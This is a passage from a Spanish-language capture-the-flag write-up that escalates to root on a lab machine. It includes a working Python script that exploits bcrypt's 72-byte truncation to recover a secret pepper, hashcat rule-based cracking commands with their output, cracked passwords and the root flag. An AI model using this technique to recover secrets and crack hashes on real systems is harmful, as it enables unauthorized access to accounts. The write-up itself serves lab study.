Pero llega un punto en el que el resultado devuelve falso. Esto se debe a que se está empleando un secreto por detrás, y es necesario añadirle unos bytes al final para burlarlo. Se puede bruteforcear para tenerlo en claro. Para ello, creo un script en python que lo automatice. Hascat tiene una regla que permite hacer el append a un caracter. Creo un diccionario adecuado a la sintaxis

```null
>>> bcrypt.checkpw(("梅"*23 + "AAA").encode(), b"$2b$05$909F/G9Z5JN9TMsqJCU/auB31o/MgMZWkDrSUozWCYVPe/u
tsIo.6")
True
```

```null
 python3
Python 3.11.1 (main, Dec 31 2022, 10:23:59) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import string
>>> characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
>>> for character in characters:
...     print(f'${character}')
... 

...
```

Al ejecutar el hashcat con esta regla, el último caracter de la contraseña corresponde al primero del secreto

```null
hashcat -m 3200 hash password -r append_dictionary

$2b$05$Ka90OvRXTj0kEDtnMt4ix.5BWAZvCeemlIjFIw6WMljKepbUVcL6u:梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅AAH
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2b$05$Ka90OvRXTj0kEDtnMt4ix.5BWAZvCeemlIjFIw6WMljK...UVcL6u
Time.Started.....: Thu Feb 23 16:41:53 2023 (0 secs)
Time.Estimated...: Thu Feb 23 16:41:53 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (password)
Guess.Mod........: Rules (append_dictionary)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      494 H/s (1.39ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 34/62 (54.84%)
Rejected.........: 0/34 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:33-34 Iteration:0-32
Candidate.Engine.: Device Generator
Candidates.#1....: 梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅AAH -> 梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅梅AAH
Hardware.Mon.#1..: Util: 26%

Started: Thu Feb 23 16:41:49 2023
Stopped: Thu Feb 23 16:41:55 2023
```

El script sería el siguiente:

```null
import os, string, bcrypt

secret = ""

while True:
    length = 71 - len(secret)
    remainder = length % 3
    junk = "梅" * int(length / 3)
    junk += "A" * remainder
    x = os.popen(f"echo {junk} | sudo /opt/hash_system/hash_password.py").read()
    pwhash = x.split(": ")[1].strip()

    for i in string.printable[:-6]:
        password = f"{junk}{secret}{i}"
        if bcrypt.checkpw(password.encode(), pwhash.encode()):
            secret += i
            print(secret)
            break
```

Obtengo el secreto y lo guardo en el fichero ```rainyday.rule```, separado por dólares ```$H$3$4$v$y$R$4$1$n```

```null
jack_adm@rainyday:~$ timeout 50 python3 bruteforce.py 
H
H3
H34
H34v
H34vy
H34vyR
H34vyR4
H34vyR41
H34vyR41n
```

Tenía del principo de la máquina, un hash del usuario Administrador en brypt. Pruebo a crackerlo con el secreto. Tras dejarlo un tiempo, encuentra lo contraseña de ```root```

```null
PS C:\Users\Usuario\Downloads\hashcat-6.2.6> .\hashcat.exe -m 3200 --user .\hashes.txt .\rockyou.txt -r .\rainyday.rule --show
root:$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W:246813579H34vyR41n
gary:$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG:rubberducky
```

Se reutiliza a nivel de sistema

```null
jack_adm@rainyday:~$ su root
Password: 
root@rainyday:/home/jack_adm# 
```

Puedo ver la segunda flag

```null
root@rainyday:/home/jack_adm# cat /root/root.txt 
b3addb0e4fa76f353c7882fe0c24f7ff
```